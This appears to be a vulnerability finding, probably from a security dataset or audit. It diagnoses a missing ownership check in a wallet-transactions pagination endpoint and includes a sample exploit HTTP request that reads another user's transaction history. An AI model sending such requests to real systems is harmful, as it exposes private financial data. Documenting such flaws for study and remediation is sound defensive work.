diagnosis: The async generator yields paginated wallet financial transaction records based solely on wallet_id path parameter. It does not verify that wallet.user_id == current_user.id, allowing an attacker to stream the complete transaction history and amounts of any wallet.
exploit_request:
GET /api/v1/wallets/wlt_corp_treasury_9941/transactions/cursor HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
